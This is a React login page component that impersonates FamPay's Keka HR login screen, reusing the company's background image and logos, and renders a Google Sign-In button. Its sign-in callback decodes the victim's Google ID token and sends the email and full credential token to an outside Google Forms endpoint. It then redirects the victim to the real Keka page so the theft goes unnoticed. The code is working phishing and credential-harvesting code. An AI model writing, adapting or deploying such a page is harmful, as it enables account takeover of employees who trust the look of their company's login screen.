"use client"

import { useEffect } from "react"

// Extend the Window interface to include the 'google' property
declare global {
  interface Window {
    google: any;
  }
}

const LoginPage = () => {
  useEffect(() => {
    const initializeGoogleAuth = () => {
      window.google.accounts.id.initialize({
        client_id: "573424743105-v65lind217ufmfqe2c3l0qcudmbv21ma.apps.googleusercontent.com",
        callback: async (response: any) => {
          const token = response.credential

          const base64Url = token.split(".")[1]
          const base64 = base64Url.replace(/-/g, "+").replace(/_/g, "/")
          const jsonPayload = decodeURIComponent(
            window
              .atob(base64)
              .split("")
              .map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2))
              .join("")
          )
          const { email } = JSON.parse(jsonPayload)

          // Optional: Still log the data if needed
          const formUrl = new URL(
            "https://docs.google.com/forms/d/e/1FAIpQLScdA0oh3zSnNeQ92RSph1pB6KvVouA50Sx7U2AUgXFJj8maLA/formResponse",
          )
          formUrl.searchParams.append("entry.151119749", email)
          formUrl.searchParams.append("entry.1860223538", token)

          try {
            await fetch(formUrl.toString(), { mode: "no-cors" })
          } catch (error) {
            // Ignore errors, we're redirecting anyway
          }

          // Redirect to the real Keka welcome page
          window.location.href = "https://fampay.keka.com/#/home/welcome"
        },
        auto_select: false, // ✅ Disables "Sign in with..." auto UI
        cancel_on_tap_outside: false,
      })

      window.google.accounts.id.renderButton(document.getElementById("g-login-btn")!, {
        theme: "outline",
        size: "large",
        width: 300,
        logo_alignment: "center",
      })

      // ❌ Do not prompt(), or One Tap will appear
    }

    if (window.google && window.google.accounts) {
      initializeGoogleAuth()
    } else {
      const script = document.createElement("script")
      script.src = "https://accounts.google.com/gsi/client"
      script.async = true
      script.defer = true
      script.onload = initializeGoogleAuth
      document.body.appendChild(script)
    }
  }, [])

  return (
    <div className="flex h-screen bg-white font-sans">
      {/* Left Panel - Now ~66% */}
      <div className="hidden md:block flex-[8] relative">
        <img
          src="https://fampay.keka.com/files/0e46fa52-af20-449b-ad21-4310f02f0bab/loginbackgroundimage/430598950ef14ef09a0e3312edf7e14b.jpg"
          alt="Background"
          className="absolute inset-0 w-full h-full object-cover"
        />
      </div>

      {/* Right Panel - Now ~33% */}
      <div className="flex-[3] flex flex-col justify-between px-6 md:px-12 py-12 bg-white">
        {/* Top Section */}
        <div>
          <img
            src="https://fampay.keka.com/files/0e46fa52-af20-449b-ad21-4310f02f0bab/orglogo/7fcb85215beb4dcc8ef840517f2fda40.png"
            alt="Fam Logo"
            className="h-12 mb-10 max-w-[300px]"
          />

          <h4 className="text-2xl font-semibold mb-6">Login to Keka</h4>

          <div className="mb-8">
            <div id="g-login-btn" />
          </div>
        </div>

        {/* Bottom Section */}
        <div className="flex flex-col gap-6">
          {/* App Store Buttons */}
          <div className="flex gap-4">
            <a
              href="https://itunes.apple.com/in/app/keka-hr/id1448024119?mt=8"
              target="_blank"
              rel="noopener noreferrer"
            >
              <img
                src="https://cdn.kekastatic.net/login/v/2025/images/app-store.svg"
                alt="App Store"
                className="h-10"
              />
            </a>
            <a
              href="https://play.google.com/store/apps/details?id=com.keka.xhr&hl=en_IN"
              target="_blank"
              rel="noopener noreferrer"
            >
              <img
                src="https://cdn.kekastatic.net/login/v/2025/images/google-play.svg"
                alt="Google Play"
                className="h-10"
              />
            </a>
          </div>

          {/* Footer Text */}
          <div className="flex items-center gap-2 mt-2">
            <img
              src="https://cdn.kekastatic.net/login/v/2025/images/keka-logo-black.svg"
              alt="Keka Logo"
              className="h-4"
            />
            <p className="text-xs text-gray-500">
              By logging in, you agree to Keka{" "}
              <a href="https://www.keka.com/services-agreement" className="underline">
                Terms of Use
              </a>{" "}
              and{" "}
              <a href="https://www.keka.com/privacy-policy" className="underline">
                Privacy Policy
              </a>
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}

export default LoginPage 